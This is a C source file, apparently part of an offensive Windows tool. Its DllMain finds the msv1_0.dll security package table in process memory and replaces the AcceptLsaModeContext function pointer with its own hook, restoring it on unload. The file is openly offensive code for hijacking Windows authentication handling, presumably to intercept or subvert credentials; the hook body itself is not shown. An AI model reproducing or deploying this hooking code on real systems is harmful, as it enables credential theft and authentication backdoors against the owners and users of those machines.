/*
Copyright © 2020 SecIdiot, realoriginal, Mumbai. All Rights Reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are
met:

1. Redistributions of source code must retain the above copyright
notice, this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright
notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution.

3. The name of the author may not be used to endorse or promote products
derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.
*/

#include "common.h"

BOOL WINAPI DllMain( HINSTANCE Instance, IN DWORD Reason, IN PVOID Param )
{
	HEAP_LIST              List;
	PSECPKG_FUNCTION_TABLE SecPkg;

	switch ( Reason )
	{
		case DLL_PROCESS_ATTACH:
			/* Create a global heap */
			if ((g_Heap = HeapCreate( 0, 0, 0 )) != NULL) 
			{
				/* Create a list of the global process heap */
				if ( InitHeapList( &List ) )
				{
					/* Find the Security Package Table in the Heap */
					if ((SecPkg = SecPkgFind( "msv1_0.dll", &List )) != NULL)
					{
						/* Apply method table hooks */
						g_SecPkg                       = CPTR( SecPkg );
						g_SpAcceptLsaModeContext       = CPTR( SecPkg->AcceptLsaModeContext );
						g_SecPkg->AcceptLsaModeContext = CPTR( SpAcceptLsaModeContext );
					};
				};
				/* Destroy our global heap */
				HeapDestroy( g_Heap );
			};
			break;
		case DLL_PROCESS_DETACH:
			/* Restore original values and unload */
			g_SecPkg->AcceptLsaModeContext = g_SpAcceptLsaModeContext;
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
	};
	return TRUE;
};
